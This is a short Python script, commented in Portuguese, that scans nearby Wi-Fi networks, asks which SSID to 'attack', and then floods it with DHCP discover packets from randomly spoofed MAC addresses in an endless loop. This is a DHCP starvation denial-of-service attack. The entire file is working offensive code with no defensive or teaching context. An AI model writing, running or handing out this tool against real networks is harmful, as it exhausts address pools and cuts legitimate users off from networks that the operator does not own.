import os
from wifi import Cell
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp

# Função para escanear redes Wi-Fi e escolher uma rede
def scan_and_choose_network(interface):
    networks = Cell.all(interface)
    available_networks = []
    for network in networks:
        available_networks.append({"SSID": network.ssid, "BSSID": network.address, "Channel": network.channel, "Signal": network.signal})
        print(f"SSID: {network.ssid}, BSSID: {network.address}, Canal: {network.channel}, Sinal: {network.signal}")
    
    if not available_networks:
        print("Nenhuma rede encontrada.")
        return None

    ssid_choice = input("Digite o SSID da rede que deseja atacar: ")
    for network in available_networks:
        if network['SSID'] == ssid_choice:
            return network
    print("Rede não encontrada.")
    return None

# Função para realizar ataque DHCP Starvation
def dhcp_starvation(interface):
    while True:
        mac = "02:00:00:%02x:%02x:%02x" % (os.getrandbits(8), os.getrandbits(8), os.getrandbits(8))
        dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(chaddr=mac) / DHCP(options=[("message-type", "discover"), "end"])
        sendp(dhcp_request, iface=interface, verbose=False)

if __name__ == "__main__":
    interface = "wlan0"
    chosen_network = scan_and_choose_network(interface)
    
    if chosen_network:
        print(f"Iniciando ataque DHCP Starvation na rede {chosen_network['SSID']}...")
        dhcp_starvation(interface)
